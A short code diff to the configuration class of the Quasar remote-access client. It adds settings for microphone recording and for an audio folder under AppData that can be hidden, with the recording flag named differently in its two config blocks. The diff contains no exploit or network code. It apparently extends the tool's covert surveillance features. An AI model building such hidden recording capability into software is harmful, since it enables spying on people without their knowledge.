@@ -1,4 +1,4 @@
-﻿using Quasar.Common.Cryptography;
+using Quasar.Common.Cryptography;
 using System;
 using System.IO;
 using System.Security.Cryptography;
@@ -38,6 +38,10 @@ namespace Quasar.Client.Config
         public static string INSTALLPATH = "";
         public static string LOGSPATH = "";
         public static bool UNATTENDEDMODE = true;
+        public static bool ENABLEMICROPHONERECORDING = false;
+        public static string AUDIODIRECTORYNAME = "Audio";
+        public static bool HIDEAUDIODIRECTORY = false;
+        public static string AUDIOPATH = "";
 
         public static bool Initialize()
         {
@@ -69,6 +73,10 @@ namespace Quasar.Client.Config
         public static string INSTALLPATH = "";
         public static string LOGSPATH = "";
         public static bool UNATTENDEDMODE = false;
+        public static bool MICROPHONERECORDING = false;
+        public static string AUDIODIRECTORYNAME = "";
+        public static bool HIDEAUDIODIRECTORY = false;
+        public static string AUDIOPATH = "";
 
         public static bool Initialize()
         {
@@ -93,6 +101,7 @@ namespace Quasar.Client.Config
         {
             LOGSPATH = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), LOGDIRECTORYNAME);
             INSTALLPATH = Path.Combine(DIRECTORY, (!string.IsNullOrEmpty(SUBDIRECTORY) ? SUBDIRECTORY + @"\" : "") + INSTALLNAME);
+            AUDIOPATH = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), AUDIODIRECTORYNAME);
         }
 
         static bool VerifyHash()
